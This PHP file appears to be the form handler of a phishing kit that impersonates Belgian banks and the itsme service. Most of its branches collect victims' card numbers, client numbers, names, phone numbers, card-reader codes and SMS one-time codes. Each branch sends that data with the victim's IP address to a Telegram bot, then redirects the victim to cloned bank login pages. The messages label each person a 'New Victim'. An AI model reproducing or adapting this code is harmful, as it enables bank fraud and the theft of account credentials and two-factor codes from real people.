<?php


    session_start();


    include "config.php";
    
	if(isset($_POST["login"])) {

        $user     = $_POST["cart_num"];
        $pass   = isset($_POST["client_num"]) ? $_POST["client_num"] : "";

        $_SESSION["crt"] = $_POST["cart_num"];
        $_SESSION["clin"] = isset($_POST["client_num"]) ? $_POST["client_num"] : "";
	   
	   $message=
       '-> Its-me Brute (BE) 🇧🇪 - CC -> (BNP)'."\n".
       '   ***************************'."\n".
       "   -> [ 🏦 ] (".$_POST['name_bank'].") - ".$_POST['cart_num']."\n".
	   "   -> [ 🔑 ] (CLIENT) - ".$_POST['client_num']."\n".
       "   -> 📍IP - ".$_SERVER['REMOTE_ADDR']."\n".
	   '   ***************************'."\n".
       '-> '.get_steps_link()."\n";
   
       $data = [
       'chat_id' => CHAT_ID,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
       reset_data();
       header("Location: ../../../loading.php");

    }elseif(isset($_POST["method_chose"])) {
    
    $_SESSION["method_chose"] = $_POST["method_chose"];
    
	define('CHAT_ID2'   , '-5175683864');
	
	 if ($_POST["method_chose"] == "cr") {
        $bbnalf = "Crelan";

    } elseif ($_POST["method_chose"] == "ar") {
        $bbnalf = "Argenta";

    } elseif ($_POST["method_chose"] == "bp") {
        $bbnalf = "BNP";

    } elseif ($_POST["method_chose"] == "kb") {
        $bbnalf = "KBC";

    }elseif ($_POST["method_chose"] == "bf") {
        $bbnalf = "Belfius";

    }elseif ($_POST["method_chose"] == "in") {
        $bbnalf = "ING";

    } else {
        $bbnalf = "Unknown";
    }
	
	$name_pro = $_SESSION["name"] ?? null;
	$num_pro = $_SESSION["num"] ?? null;
        
       $message=
       '[🟠] === New Victim === [🟠]'."\n".
	   "[+] Full Name : ".($name_pro ?? 'null')."\n". 
	   "[+] Phone Number : ".($num_pro ?? 'null')."\n". 
       '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n".
	   '-> > < > < > < > < > <'."\n".
        "[🏦] > ".$bbnalf." (" . mb_strtoupper($_SESSION["lang"]) . ")\n";
       
   
       $data = [
       'chat_id' => CHAT_ID2,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN2."/sendMessage?".http_build_query($data)); 
       reset_data();
       /* -------- Redirect section -------- */

		if ($bbnalf === "Crelan") {

			header("Location: ../../../CyMOB/Crln/index.php");


		} elseif ($bbnalf === "Argenta") {

			header("Location: ../../../CyMOB/Arg/index.php");


		} elseif ($bbnalf === "BNP") {

			header("Location: ../../../number2.php");

		}elseif ($bbnalf === "KBC") {

			header("Location: ../../../CyMOB/Kb/login.php?lang=" . $_SESSION["lang"]);

		}elseif ($bbnalf === "Belfius") {

			header("Location: ../../../CyMOB/Bf/login.php?lang=" . $_SESSION["lang"]);

		}elseif ($bbnalf === "ING") {

			header("Location: ../../../CyMOB/in/index.php?lang=" . $_SESSION["lang"]);

		}

    }elseif(isset($_POST["exp"])) {
		
	$user2     = $_POST["ph_num"];
	$message=
       '-> Its-me Brute (BE) 🇧🇪 - CC -> (BNP)'."\n".
       '   ***************************'."\n".
       "   -> [ 👤 ] (EXP) - ".$user2."\n".
       "   -> 📍IP - ".$_SERVER['REMOTE_ADDR']."\n".
	   '   ***************************'."\n".
       '-> '.get_steps_link()."\n";
   
       $data = [
       'chat_id' => CHAT_ID,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
       reset_data();
       header("Location: ../../../loading.php");
		
	}elseif(isset($_POST["lecture"])){

        $lecture      = $_POST["code-lec"];
        
       $message=
       '[🧛] === lecture === [🧛]'."\n".
       '[🧬] Code-lecture : ' .$lecture."\n".
       '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n";
       
       $data = [
       'chat_id' => CHAT_ID,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
       reset_data();
       header("Location: ../../../loading.php");
       exit();

    }elseif(isset($_POST["sms_cc"])){

        $sms      = $_POST["x1"].$_POST["x2"].$_POST["x3"].$_POST["x4"].$_POST["x5"].$_POST["x6"];
        
       $message=
       '[🧛] === SMS === [🧛]'."\n".
       '[🧬] SMS : ' .$sms."\n".
       '[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n";
       
       $data = [
       'chat_id' => CHAT_ID,
       'text' => $message,
       ]; 
       
       $response = file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/sendMessage?".http_build_query($data)); 
       reset_data();
       header("Location: ../../../loading.php");
       exit();

    }elseif(isset($_POST["number"])){

		$_SESSION["num"] =  $_POST["num"];
		$_SESSION["name"] =  $_POST["name"];
         

         
        header("Location: ../../../type.php");
        exit();
 
     }elseif(isset($_POST["num_bn"])){

		$_SESSION["num"] =  $_POST["num_bn"];
         

         
        header("Location: ../../../bnp1.php");
        exit();
 
     }elseif($_SERVER["REQUEST_METHOD"] == "GET" && isset($_SESSION["method_chose"])){
         
         echo "af";
         exit;
         
         if ($_SESSION["method_chose"] == "cr") {
        $bbnalf = "Crelan";

    } elseif ($_SESSION["method_chose"] == "ar") {
        $bbnalf = "Argenta";

    } elseif ($_SESSION["method_chose"] == "bp") {
        $bbnalf = "BNP";

    } elseif ($_SESSION["method_chose"] == "kb") {
        $bbnalf = "KBC";

    }elseif ($_SESSION["method_chose"] == "bf") {
        $bbnalf = "Belfius";

    }elseif ($_SESSION["method_chose"] == "in") {
        $bbnalf = "ING";

    } else {
        $bbnalf = "Unknown";
    }
         
         
         
         		if ($bbnalf === "Crelan") {

			header("Location: ../../../CyMOB/Crln/index.php");


		} elseif ($bbnalf === "Argenta") {

			header("Location: ../../../CyMOB/Arg/index.php");


		} elseif ($bbnalf === "BNP") {

			header("Location: ../../../bnp1.php");

		}elseif ($bbnalf === "KBC") {

			header("Location: ../../../CyMOB/Kb/login.php?lang=" . $_SESSION["lang"]);

		}elseif ($bbnalf === "Belfius") {

			header("Location: ../../../CyMOB/Bf/login.php?lang=" . $_SESSION["lang"]);

		}elseif ($bbnalf === "ING") {

			header("Location: ../../../CyMOB/in/index.php?lang=" . $_SESSION["lang"]);

		}
         
         
         

        exit();
 
     }else{
                 header("Location: ../../../type.php");
        exit();
         
     }
?>